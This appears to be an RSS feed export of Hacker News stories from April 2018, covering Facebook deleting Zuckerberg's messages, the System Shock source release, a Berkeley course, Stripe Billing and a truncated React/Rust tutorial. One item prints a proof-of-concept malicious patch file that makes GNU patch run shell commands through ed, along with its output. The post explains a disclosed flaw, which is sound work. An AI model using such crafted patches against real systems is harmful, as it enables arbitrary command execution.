<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=hnrss.org%2Fnewest%3Fpoints%3D200&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://hnrss.org/newest?points=200" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>Hacker News: Newest</title>
<link>https://news.ycombinator.com/newest</link>
<description>Hacker News RSS</description>
<item>
<title>Facebook retracted Zuckerberg’s messages from recipients’ inboxes</title>
<link>https://techcrunch.com/2018/04/05/zuckerberg-deleted-messages</link>
<guid isPermaLink="true" >https://techcrunch.com/2018/04/05/zuckerberg-deleted-messages</guid>
<description>&lt;div id=&quot;&quot;&gt;&lt;p&gt;

&lt;h2 class=&quot;article__subtitle&quot;&gt;Facebook says it was for security, but is it a breach of user trust?&lt;/h2&gt;
&lt;/p&gt;
&lt;div class=&quot;article__byline-wrapper&quot;&gt;
&lt;div class=&quot;article__byline&quot;&gt;&lt;a href=&quot;https://techcrunch.com/author/josh-constine/&quot;&gt;Josh Constine&lt;/a&gt; &lt;span class=&quot;article__byline__meta&quot;&gt;&lt;a href=&quot;https://twitter.com/JoshConstine&quot;&gt;@&lt;/a&gt; &lt;span class=&quot;text--green&quot;&gt;/&lt;/span&gt; 11 hours&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;article__featured-image-wrapper&quot;&gt;&lt;img src=&quot;https://techcrunch.com/wp-content/uploads/2018/04/gettyimages-669889320-trash-bin.jpg?w=730&quot; class=&quot;article__featured-image&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;&lt;div readability=&quot;130.48850142793&quot;&gt;
&lt;p&gt;&lt;span class=&quot;featured__span-first-words&quot;&gt;You can’t remove&lt;/span&gt; Facebook messages from the inboxes of people you sent them to, but &lt;a class=&quot;crunchbase-link&quot; href=&quot;https://www.crunchbase.com/organization/facebook/&quot; target=&quot;_blank&quot; data-type=&quot;organization&quot; data-entity=&quot;facebook&quot;&gt;Facebook&lt;/a&gt; did that for Mark Zuckerberg and other executives. Three sources confirm to TechCrunch that old Facebook messages they received from Zuckerberg have disappeared from their Facebook inboxes, while their own replies to him conspiculously remain. An email receipt of a Facebook message from 2010 reviewed by TechCrunch proves Zuckerberg sent people messages that no longer appear in their Facebook chat logs or in the files available from Facebook’s Download Your Information tool.&lt;/p&gt;
&lt;p&gt;When asked by TechCrunch about the situation, Facebook claimed it was done for corporate security in this statement:&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;img class=&quot;alignright wp-image-1617782&quot; src=&quot;https://techcrunch.com/wp-content/uploads/2018/04/facebook-messenger-2011.png?w=356&quot; alt=&quot;&quot; width=&quot;309&quot; height=&quot;211&quot;/&gt;“After Sony Pictures’ emails were hacked in 2014 we made a number of changes to protect our executives’ communications. These included limiting the retention period for Mark’s messages in Messenger. We did so in full compliance with our legal obligations to preserve messages.”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;However, Facebook never publicly disclosed the removal of messages from users’ inboxes, nor privately informed the recipients. That raises the question of whether this was a breach of user trust. When asked that question directly over Messenger, Zuckerberg declined to provide a statement.&lt;/p&gt;
&lt;h2&gt;Tampering With Users’ Inboxes&lt;/h2&gt;
&lt;p&gt;A Facebook spokesperson confirmed to TechCrunch that users can only delete messages their own inboxes, and that they would still show up in the recipient’s thread. There appears to be no “retention period” for normal users’ messages, as my inbox shows messages from as early as 2005. That indicates Zuckerberg and other executives received special treatment in being able to pull back previously sent messages.&lt;/p&gt;
&lt;p&gt;Facebook chats sent by Zuckerberg from several years ago or older were missing from the inboxes of both former employees and non-employees. What’s left makes it look the recipients were talking to themselves, as only their side of back-and-forth conversations with Zuckerberg still appear. Three sources asked to remain anonymous out of fear of angering Zuckerberg or burning bridges with the company.&lt;/p&gt;
&lt;p&gt;[Update: Recent messages from Zuckerberg remain in users’ inboxes. Old messages from before 2014 still appear to some users, indicating the retraction did not apply to all chats the CEO sent. But more sources have come forward since publication, saying theirs disappeared as well.]&lt;/p&gt;
&lt;p&gt;None of &lt;a href=&quot;https://www.facebook.com/terms.php&quot;&gt;Facebook’s terms of service&lt;/a&gt; appear to give it the right to remove content from users’ accounts unless it violates the company’s community standards. While it’s somewhat standard for corporations to have data retention policies that see them delete emails or other messages from their own accounts that were sent by employees, they typically can’t remove the messages from the accounts of recipients outside the company. It’s rare that these companies own the communication channel itself and therefore host both sides of messages as Facebook does in this case, which potentially warrants a different course of action with more transparency than quietly retracting the messages.&lt;/p&gt;
&lt;p&gt;Facebook’s power to tamper with users’ private message threads could alarm some. The issue is amplified by the fact that Facebook Messenger now has 1.3 billion users, making it one of the most popular communication utilities in the world.&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;aligncenter size-large wp-image-1617781&quot; src=&quot;https://techcrunch.com/wp-content/uploads/2018/04/facebook-messenger-1-3-billion-monthly-active-users.png?w=680&quot; alt=&quot;&quot; width=&quot;680&quot; height=&quot;383&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Zuckerberg is known to have &lt;a href=&quot;https://www.bloomberg.com/news/articles/2017-01-18/this-team-runs-mark-zuckerberg-s-facebook-page&quot;&gt;a team that helps him run his Facebook profile&lt;/a&gt;, with some special abilities for managing his 105 million followers and constant requests for his attention. For example, Zuckerberg’s profile doesn’t show a button to add him as a friend on desktop, and the button is grayed out and disabled on mobile. But the ability to change the messaging inboxes of other users is far more concerning.&lt;/p&gt;
&lt;p&gt;Facebook may have sought to prevent leaks of sensitive corporate communications. Following the Sony hack, emails of Sony’s president Michael Lynton who sat on Snap Inc’s board were exposed, &lt;a href=&quot;https://techcrunch.com/2014/12/16/snapchat-emails-not-so-ephemeral/&quot;&gt;revealing secret acquisitions and strategy&lt;/a&gt;.&lt;/p&gt;
&lt;div id=&quot;attachment_1617785&quot; class=&quot;wp-caption alignright&quot; readability=&quot;32&quot;&gt;&lt;img class=&quot;vertical wp-image-1617785 size-large&quot; src=&quot;https://techcrunch.com/wp-content/uploads/2018/04/mark-zuckerberg-young.png?w=313&quot; alt=&quot;&quot; width=&quot;313&quot; height=&quot;469&quot;/&gt;&lt;p class=&quot;wp-caption-text&quot;&gt;Mark Zuckerberg during the early days of Facebook&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;However, Facebook may have also looked to thwart the publication of potentially embarrassing personal messages sent by Zuckerberg or other executives. In 2010, &lt;a href=&quot;http://www.businessinsider.com/well-these-new-zuckerberg-ims-wont-help-facebooks-privacy-problems-2010-5&quot;&gt;Silicon Valley Insider &lt;/a&gt;published now-infamous instant messages from a 19-year-old Zuckerberg to a friend shortly after starting The Facebook in 2004. “yea so if you ever need info about anyone at harvard . . . just ask . . . i have over 4000 emails, pictures, addresses, sns” Zuckerberg wrote to a friend. “what!? how’d you manage that one?” they asked. “people just submitted it . .  i don’t know why . . . they “trust me” . . . dumb fucks” Zuckerberg explained.&lt;/p&gt;
&lt;p&gt;The New Yorker later confirmed the messages with Zuckerberg, who told the publication he “absolutely” regretted them. “If you’re going to go on to build a service that is influential and that a lot of people rely on, then you need to be mature, right? I think I’ve grown and learned a lot” said Zuckerberg.&lt;/p&gt;
&lt;p&gt;If the goal of Facebook’s security team was to keep a hacker from accessing the accounts of executives and therefore all of their messages, they could have merely been deleted on their side the way any Facebook user is free to do, without them disappearing from the various recipients’ inboxes. If Facebook believed it needed to remove the messages entirely from its servers in case the company’s backend systems we breached, a disclosure of some kind seems reasonable.&lt;/p&gt;
&lt;p&gt;Now as Facebook encounters increased scrutiny regarding how it treats users’ data in the wake of the Cambridge Analytica scandal, the retractions could become a bigger issue. Zuckerberg is slated to speak in front of the U.S. Senate Judiciary and Commerce committees on April 10 as well as the House Energy and Commerce Committee on April 11. They could request more information about Facebook removing messages or other data from users’ accounts without their consent. While Facebook is trying to &lt;a href=&quot;https://techcrunch.com/2018/04/04/zuckerberg-raw/&quot;&gt;convey that it understands its responsibilities&lt;/a&gt;, the black mark left on public opinion by past behavior may prove permanent.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;If you have more info on this situation, including evidence of messages from other Facebook executives disappearing, please &lt;a href=&quot;https://twitter.com/JoshConstine/&quot;&gt;contact this article’s author Josh Constine via open Twitter DMs&lt;/a&gt;, josh@techcrunch.com, or encrypted Signal chat at (585)750-5674.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;For more on Facebook’s recent troubles, read our feature pieces:&lt;/em&gt;&lt;/p&gt;




&lt;/div&gt;</description>
<pubDate>Fri, 06 Apr 2018 04:11:25 +0000</pubDate>
<dc:creator>smacktoward</dc:creator>
<og:title>Facebook retracted Zuckerberg’s messages from recipients’ inboxes</og:title>
<og:description>You can’t remove Facebook messages from the inboxes of people you sent them to, but Facebook did that for Mark Zuckerberg and other executives. Three sources confirm to TechCrunch that old Facebook messages they received from Zuckerberg have disappeared from their Facebook inboxes, while thei…</og:description>
<og:image>https://techcrunch.com/wp-content/uploads/2018/04/gettyimages-669889320-trash-bin.jpg?w=750</og:image>
<og:url>http://social.techcrunch.com/2018/04/05/zuckerberg-deleted-messages/</og:url>
<og:type>article</og:type>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://techcrunch.com/2018/04/05/zuckerberg-deleted-messages/</dc:identifier>
</item>
<item>
<title>System Shock 1 source code released under GPL</title>
<link>https://github.com/NightDiveStudios/shockmac</link>
<guid isPermaLink="true" >https://github.com/NightDiveStudios/shockmac</guid>
<description>&lt;h3&gt;README.md&lt;/h3&gt;
&lt;article class=&quot;markdown-body entry-content&quot; itemprop=&quot;text&quot;&gt;
&lt;p&gt;Copyright 2015-2018, Night Dive Studios, Incorporated.&lt;/p&gt;
&lt;p&gt;This file contains the following sections:&lt;/p&gt;
&lt;p&gt;GENERAL NOTES LICENSE&lt;/p&gt;

&lt;h2&gt;Game data and patching:&lt;/h2&gt;
&lt;p&gt;This source release does not contain any game data, the game data is still covered by the original EULA and must be obeyed as usual.&lt;/p&gt;
&lt;h2&gt;Compiling on MacOS 9:&lt;/h2&gt;
&lt;p&gt;A project file for Metrowerks Codewarrior is provided in ShockMac/Shock.µ&lt;/p&gt;
&lt;p&gt;You will need a PowerPC to build the Mac version of System Shock. Fortunately, there are emulators out there that are able to run PowerPC Mac Applications, like SheepShaver. You also need Metrowerks CodeWarrior 10 Tools to build the project and Stuffit Expander to unpack the project files and source code. The game was initially built with an older version of CodeWarrior, but we tested it with CW 10 Gold Tools (IDE 1.7) and it was able to build a working executable. Things you will need:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;A PowerMac or an emulator like SheepShaver;&lt;/li&gt;
&lt;li&gt;CodeWarrior for PowerPC (CW 10 Gold Tools works)&lt;/li&gt;
&lt;li&gt;The original Mac System Shock data.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;About the source code storage:&lt;/p&gt;
&lt;p&gt;The System Shock source code and project files are stored in the Macintosh file system, which implies the usage of two forks for each file, a data fork and a resource fork (as well as a metadata section). For that reason, we decided to include both the compressed files and uncompressed files. The uncompressed files are stored in the ShockMac folder. Inside each folder there are two subfolders: one named &quot;.rsrc&quot;, which stores the resource fork for each file, and another named &quot;.finf&quot;, which stores the metada for every file. The files can also be found compressed inside &quot;ShockMac.sit&quot; under the Stuffit format. This format allows storeing both forks and metada information for every file.&lt;/p&gt;
&lt;p&gt;About the source code organization:&lt;/p&gt;
&lt;p&gt;The source code is split into three sections: Game code, Mac code and Libraries.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Game code is related to System Shock-specific code, like enemy AI, level rendering, etc.&lt;/li&gt;
&lt;li&gt;Mac code is related to Macintosh-specific code, like the typical user interface and internal behavior.&lt;/li&gt;
&lt;li&gt;Libraries are related to code shared by other Looking Glass games, like 2D and 3D rendering, sound, input, resources, palette etc.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;How to unpack the project:&lt;/p&gt;
&lt;p&gt;In your Mac, open ShockMac.sit using a program capable of reading Stuffit packed files. After unpacking it, a folder named ShockMac will be generated with the contents inside it.&lt;/p&gt;
&lt;p&gt;How to compile:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Double-click on the CodeWarrior IDE 1.7 icon to start the IDE&lt;/li&gt;
&lt;li&gt;Open one of the projects inside the folder ShockMac:Libraries&lt;/li&gt;
&lt;li&gt;Click on Project -&amp;gt; Make to build the library.&lt;/li&gt;
&lt;li&gt;Move the generated library file to the folder ShockMac:Lib&lt;/li&gt;
&lt;li&gt;Close the project by clicking on File -&amp;gt; Close&lt;/li&gt;
&lt;li&gt;Repeat steps (2) to (5) for the following projects:
&lt;ul&gt;&lt;li&gt;ShockMac:Libraries:2d:2dLibPPC.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:3d:3dLibPPC.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:DSTRUCT:DSTRUCT.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:EDMS:EDMS.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:FIX:FIX.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:FIXPP:FIXPP.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:INPUT:INPUT.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:LG:LG.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:PALETTE:PALETTE.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:RES:RES.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:RND:RND.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:SND:SND.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:UI:UI.µ&lt;/li&gt;
&lt;li&gt;ShockMac:Libraries:VOX:VOX.µ&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Open the project ShockMac:LIB:LGHeadersPPC.µ&lt;/li&gt;
&lt;li&gt;Precompile by clicking on Project -&amp;gt; Precompile&lt;/li&gt;
&lt;li&gt;Close the project&lt;/li&gt;
&lt;li&gt;Open the project ShockMac:Shock.µ&lt;/li&gt;
&lt;li&gt;Click on Project -&amp;gt; Make to build the game.&lt;/li&gt;
&lt;li&gt;Make sure the game resources are in the folder ShockMac:Data&lt;/li&gt;
&lt;li&gt;Launch the game.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The System Shock source code is available under the terms of the GNU General Public License v3.0&lt;/p&gt;
&lt;p&gt;See COPYING.txt for the GNU GENERAL PUBLIC LICENSE&lt;/p&gt;
&lt;/article&gt;</description>
<pubDate>Thu, 05 Apr 2018 21:41:23 +0000</pubDate>
<dc:creator>jsheard</dc:creator>
<og:image>https://avatars2.githubusercontent.com/u/38115186?s=400&amp;v=4</og:image>
<og:type>object</og:type>
<og:title>NightDiveStudios/shockmac</og:title>
<og:url>https://github.com/NightDiveStudios/shockmac</og:url>
<og:description>shockmac - System Shock (PowerMac version / Official GPL Release)</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://github.com/NightDiveStudios/shockmac</dc:identifier>
</item>
<item>
<title>Berkeley offers its fastest-growing course – data science – online for free</title>
<link>http://news.berkeley.edu/2018/03/29/berkeley-offers-its-fastest-growing-course-data-science-online-for-free/</link>
<guid isPermaLink="true" >http://news.berkeley.edu/2018/03/29/berkeley-offers-its-fastest-growing-course-data-science-online-for-free/</guid>
<description>&lt;p&gt;The fastest-growing course in UC Berkeley’s history — Foundations of Data Science — is being offered free online this spring for the first time through the campus’s online education hub, edX.&lt;/p&gt;
&lt;p&gt;Data science is becoming important to more and more people because the world is increasingly data-driven — and not just science and tech but the humanities, business and government.&lt;/p&gt;
&lt;div id=&quot;attachment_67446&quot; class=&quot;wp-caption alignleft&quot;&gt;&lt;a href=&quot;https://news.berkeley.edu/wp-content/uploads/2018/03/datascience-410.jpg&quot; data-rel=&quot;lightbox-0&quot; title=&quot;&quot;&gt;&lt;img class=&quot;size-full wp-image-67446&quot; src=&quot;https://news.berkeley.edu/wp-content/uploads/2018/03/datascience-410.jpg&quot; alt=&quot;David Wagner, Ani Adhikari, John DeNero&quot; width=&quot;410&quot; height=&quot;275&quot;/&gt;&lt;/a&gt;
&lt;p class=&quot;wp-caption-text&quot;&gt;Data 8X instructors David Wagner, Ani Adhikari and John DeNero&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;“You’ll learn to program when studying data science — but not for the primary purpose of building apps or games,” says Berkeley computer science Professor John DeNero. “Instead, we use programming to understand the world around us.”&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.edx.org/professional-certificate/berkeleyx-foundations-of-data-science#courses&quot;&gt;The course — Data 8X&lt;/a&gt; (Foundations of Data Science) — covers everything from testing hypotheses, applying statistical inferences, visualizing distributions and drawing conclusions, all while coding in Python and using real-world data sets. One lesson might take economic data from different countries over the years to track global economic growth. The next might use a data set of cell samples to create a classification algorithm that can diagnose breast cancer. (Learn more from &lt;a href=&quot;https://data.berkeley.edu/education/data-8x&quot;&gt;a video on the Berkeley data science website&lt;/a&gt;.)&lt;/p&gt;
&lt;p&gt;The online program is based on the Foundations of Data Science course that Berkeley launched on campus in 2015 and now has more than 1,000 students enrolling every semester.&lt;/p&gt;
&lt;p&gt;The intent is “helping students from any major or any background to address questions that interest them, using the powerful tools of data science,” Provost Paul Alivisatos &lt;a href=&quot;http://docs.house.gov/meetings/SY/SY15/20170726/106330/HHRG-115-SY15-Wstate-AlivisatosA-20170726.pdf&quot;&gt;told a congressional subcommittee on research and technology&lt;/a&gt; in July 2017. “From linguistics to chemistry, and from history to economics, students from over 60 majors have responded, and this is the fastest-growing program in the history of Berkeley…”&lt;/p&gt;
&lt;p&gt;The Foundations of Data Science edX Professional Certificate program is a sequence of three five-week courses taught by three winners of Berkeley’s top teaching honor, the Distinguished Teaching Award: &lt;a href=&quot;https://www.edx.org/bio/john-denero&quot;&gt;DeNero&lt;/a&gt;, statistics professor &lt;a href=&quot;https://www.edx.org/bio/ani-adhikari-0&quot;&gt;Ani Adhikari&lt;/a&gt; and computer science professor &lt;a href=&quot;http://people.eecs.berkeley.edu/~daw/&quot;&gt;David Wagner&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;“&lt;span&gt;It’s exciting to be part of an initiative that brings data science to all, regardless of their background&lt;/span&gt;,” says Adhikari&lt;strong&gt;. “&lt;/strong&gt;&lt;span&gt;After all, everyone has to be able to reason based on data and to gain insight from data. And data science itself will benefit from diverse perspectives about what’s important. Our goal is to bring data science to the widest possible audience.”&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Anyone in the world can enroll for free; learners who want to earn the certificate will need to pay.&lt;/p&gt;
&lt;p&gt;The first of the three parts starts at 9 a.m. (PDT) on Monday, April 2. &lt;a href=&quot;https://www.edx.org/course/foundations-data-science-computational-uc-berkeleyx-data8-1x&quot;&gt;Enrollment&lt;/a&gt; will remain open after the course begins.&lt;/p&gt;

</description>
<pubDate>Thu, 05 Apr 2018 19:11:11 +0000</pubDate>
<dc:creator>seycombi</dc:creator>
<og:type>article</og:type>
<og:title>Berkeley offers its fastest-growing course – data science – online, for free</og:title>
<og:url>http://news.berkeley.edu/2018/03/29/berkeley-offers-its-fastest-growing-course-data-science-online-for-free/</og:url>
<og:description>Data science is increasingly popular at Berkeley because the world is increasingly data-driven</og:description>
<og:image>http://news.berkeley.edu/wp-content/uploads/2018/03/datascience-750.jpg</og:image>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://news.berkeley.edu/2018/03/29/berkeley-offers-its-fastest-growing-course-data-science-online-for-free/</dc:identifier>
</item>
<item>
<title>Patch runs ed, and ed can run anything</title>
<link>http://rachelbythebay.com/w/2018/04/05/bangpatch/</link>
<guid isPermaLink="true" >http://rachelbythebay.com/w/2018/04/05/bangpatch/</guid>
<description>&lt;p&gt;Okay, this is kind of awesome, if you like watching the world burn.&lt;/p&gt;
&lt;p&gt;The short version is: patch runs ed... and ed can run arbitrary commands, including when it's called from patch.&lt;/p&gt;
&lt;p&gt;Check this out. I've taken the proof of concept and changed it slightly:&lt;/p&gt;
&lt;pre&gt;
$ cat evil.patch 
--- /dev/null   2018-13-37 13:37:37.000000000 +0100                            
+++ b/beep.c    2018-13-37 13:38:38.000000000 +0100                            
1337a                                                                          
1,112d                                                                         
!touch /tmp/0wned; ls -la /tmp/0wned
.                                                                              
$ patch &amp;lt; evil.patch 
?
?
-rw-r--r-- 1 edu users 0 Apr  5 10:42 /tmp/0wned
?
patch: **** /usr/bin/ed FAILED
$ 
&lt;/pre&gt;
&lt;p&gt;This came up as part of the discussion on the &quot;beep exploit&quot; yesterday. I found it buried in the HN /new queue as a simple &lt;a href=&quot;https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=894667#19&quot;&gt;link to the Debian bug tracker&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;This seems far too good to leave hidden in there.&lt;/p&gt;
&lt;p&gt;Subprocesses, am I right?&lt;/p&gt;
&lt;p&gt;Late update: it looks like FreeBSD &lt;a href=&quot;https://www.freebsd.org/security/advisories/FreeBSD-SA-15:18.bsdpatch.asc&quot;&gt;fixed this same sort of thing&lt;/a&gt; in 2015. GNU patch, however (shown above), clearly has not.&lt;/p&gt;
&lt;p&gt;Another update: OpenBSD also &lt;a href=&quot;https://ftp.openbsd.org/pub/OpenBSD/patches/5.7/common/013_patch.patch.sig&quot;&gt;patched it&lt;/a&gt; in 2015. It looks like they had it first, which I suppose makes sense. Also, I'm hearing it can't exec other programs any more, which is pretty awesome. That's the right way to close this kind of door.&lt;/p&gt;
</description>
<pubDate>Thu, 05 Apr 2018 18:19:47 +0000</pubDate>
<dc:creator>akerl_</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://rachelbythebay.com/w/2018/04/05/bangpatch/</dc:identifier>
</item>
<item>
<title>Stripe Billing</title>
<link>https://stripe.com/blog/billing</link>
<guid isPermaLink="true" >https://stripe.com/blog/billing</guid>
<description>&lt;p&gt;Today, we’re excited to launch &lt;a href=&quot;https://stripe.com/billing&quot;&gt;Stripe Billing&lt;/a&gt;, a new suite of tools to help companies of all sizes automate, optimize, and scale recurring business models. This new product is an evolution of Stripe Subscriptions and adds many new features.&lt;/p&gt;
&lt;p&gt;Increasingly, the most innovative companies are establishing recurring relationships with their customers. As these businesses iterate to find the best pricing and sales strategy, they’re often unnecessarily constrained by what their billing system allows. For some companies that already used Stripe, our Subscriptions product was limiting as well. They needed to do more than just simple subscription management. Based on feedback from many of our customers and others, we built Stripe Billing to provide fast-growing businesses the tools to move quickly and design billing around customer experience.&lt;/p&gt;
&lt;p&gt;Stripe Billing has two components. For developers, our APIs provide composable building blocks that make it easy to design and iterate on different billing models. For business teams, we’ve built easy-to-use Dashboard tools that help manage recurring billing from end to end.&lt;/p&gt;
&lt;h3&gt;Flexible building blocks for billing&lt;/h3&gt;
&lt;p&gt;Fast-growing companies regularly experiment with billing as they grow their business and expand their offerings. Examples include Slack’s “fair billing policy”, Meetup’s new metered billing, and Postmates’ recently-launched subscriptions offering. As businesses iterate on pricing and launch new business lines, they need the ability to customize billing quickly and easily.&lt;/p&gt;
&lt;p&gt;At the core of Stripe Billing are new APIs and Dashboard tools that help businesses intuitively design and represent even the most complex billing models—from simple seat licensing to complex multi-layered tiered metered plans. Stripe Billing also makes it easy to add or change billing models, so you can easily test and roll out different pricing. You can learn more in &lt;a href=&quot;https://stripe.com/docs/billing/quickstart&quot;&gt;our docs&lt;/a&gt;.&lt;/p&gt;
&lt;p class=&quot;blog-callout-full&quot;&gt;“Expanding into offerings for businesses not only demanded new product features and capabilities but also foundational changes to Meetup’s billing infrastructure. Stripe’s open API and simple, user-friendly interface made it easy for the entire team.”&lt;br/&gt;&lt;strong&gt;— Sylvan Boucard&lt;/strong&gt;, Product Manager at Meetup&lt;/p&gt;
&lt;h3&gt;Faster payments with Stripe-hosted invoices&lt;/h3&gt;
&lt;p&gt;Stripe Billing also includes a new way for U.S. businesses to invoice customers. Starting today, Stripe can email your customers an invoice that perfectly matches your company’s branding and will securely collect payments. You can &lt;a href=&quot;https://stripe.com/billing#invoices&quot;&gt;try out our demo&lt;/a&gt; or &lt;a href=&quot;https://dashboard.stripe.com/invoices/create&quot;&gt;create an invoice&lt;/a&gt; from your Dashboard.&lt;/p&gt;
&lt;p&gt;In addition to credit and debit card payments, invoices also support ACH and wire transfers in the U.S. This should be especially helpful to businesses that have automated billing for self-serve accounts, but still rely on accounts-receivable processes to handle larger invoices. Behind the scenes, Stripe now generates a unique virtual bank account number for each of your customers, which keeps your company’s banking details private. Any payments received appear in your Stripe balance and invoices are automatically reconciled and marked as closed.&lt;/p&gt;
&lt;p class=&quot;blog-callout-full&quot;&gt;“For large invoice amounts, our customers expect to pay via invoice, rather than credit card. As a fast-growing business, handling invoicing manually quickly became a huge pain. With Stripe, we automate all aspects of invoicing and accepting ACH and wire payments which means we can scale our business faster.”&lt;br/&gt;&lt;strong&gt;— Eric Koslow&lt;/strong&gt;, Co-founder, Lattice&lt;/p&gt;
&lt;h3&gt;Smart revenue recovery&lt;/h3&gt;
&lt;p&gt;Nearly a quarter of churn is caused by missed payments or declined cards. Stripe Billing now includes our automated card updater, which saves your customers from having to do data entry if their card is reissued by automatically syncing new payment details (such as updated expiry dates) from our financial partners.&lt;/p&gt;
&lt;p&gt;We're also introducing a new feature: smart retry logic. It’s powered by the same machine learning infrastructure behind &lt;a href=&quot;https://stripe.com/radar&quot;&gt;Stripe Radar&lt;/a&gt;. Our algorithms train on data across the billions of payments in the Stripe network to predict the right way to retry failed payments. With smart retry logic, we can reduce involuntary churn, maximize payment acceptance, and decrease toil for your users and customer support teams.&lt;/p&gt;
&lt;p&gt;In 2017, Stripe’s recovery tools reduced payment declines up to 45% on average and increased revenue 10% on average.&lt;/p&gt;
&lt;p class=&quot;blog-callout-full&quot;&gt;Bench recovered 12% of revenue through card account updater in 2017.&lt;/p&gt;
&lt;p&gt;We’ve made getting started with Stripe Billing as easy as possible. You can &lt;a href=&quot;https://dashboard.stripe.com/invoices/create&quot;&gt;start sending invoices&lt;/a&gt; today right from the Dashboard. Since Stripe Billing’s APIs are modular, you can choose to build a new metered billing system or run a lightweight pricing experiment for your next product or feature launch. (Flexible billing and smart recovery tools are available globally today. Invoices are available in the U.S. and coming soon to many more countries.)&lt;/p&gt;
&lt;p&gt;If you’re using Stripe Subscriptions today, check out &lt;a href=&quot;https://stripe.com/docs/billing/quickstart&quot;&gt;our guide to getting started&lt;/a&gt;. We hope Stripe Billing helps your business. Let us know if you have any feedback or questions—we’re just getting started and we’d love to &lt;a href=&quot;mailto:noah@stripe.com&quot;&gt;hear from you&lt;/a&gt;.&lt;/p&gt;
&lt;p class=&quot;cta&quot;&gt;Build your recurring business model with Stripe Billing. &lt;a href=&quot;https://stripe.com/billing&quot; class=&quot;button&quot;&gt;Learn More&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 05 Apr 2018 17:20:26 +0000</pubDate>
<dc:creator>craigkerstiens</dc:creator>
<og:title>Introducing Stripe Billing</og:title>
<og:url>https://stripe.com/blog/billing</og:url>
<og:description>We’re launching Stripe Billing, a new suite of tools to help you automate, optimize, and scale recurring business models.</og:description>
<og:image>https://stripe.com/img/v3/billing/social.png</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://stripe.com/blog/billing</dc:identifier>
</item>
<item>
<title>Making a Statically-Linked, Single-File Web App with React and Rust</title>
<link>https://anderspitman.net/2018/04/04/static-react-rust-webapp/</link>
<guid isPermaLink="true" >https://anderspitman.net/2018/04/04/static-react-rust-webapp/</guid>
<description>&lt;a class=&quot;btn home&quot; href=&quot;https://anderspitman.net/&quot; title=&quot;&quot;&gt;«&lt;/a&gt;&lt;footer class=&quot;post-info&quot;&gt;&lt;span class=&quot;post-meta&quot;&gt;&lt;time datetime=&quot;2018.04.04&quot;&gt;2018.04.04&lt;/time&gt;&lt;/span&gt;&lt;/footer&gt;&lt;p&gt;This tutorial will cover the basics of creating a minimal React app which can be deployed as a statically-linked Rust binary. What this accomplishes is having all of your code, including HTML, JavaScript, CSS, and Rust, packaged into a single file that will run on pretty much any 64-bit Linux system, regardless of the kernel version or installed libraries.&lt;/p&gt;
&lt;p&gt;Complete source is available on &lt;a href=&quot;https://github.com/anderspitman/react_rust_webapp&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Simpler deployment:&lt;/strong&gt; Having a static binary means you just have to copy the file to your servers and run it.&lt;/li&gt;
